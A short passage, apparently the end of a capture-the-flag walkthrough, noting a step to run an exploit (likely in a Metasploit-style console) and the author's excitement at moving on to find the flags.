box))\n4-Use exploit (exploit OR run)\nIt works!! Now time to dig around and find the flags.
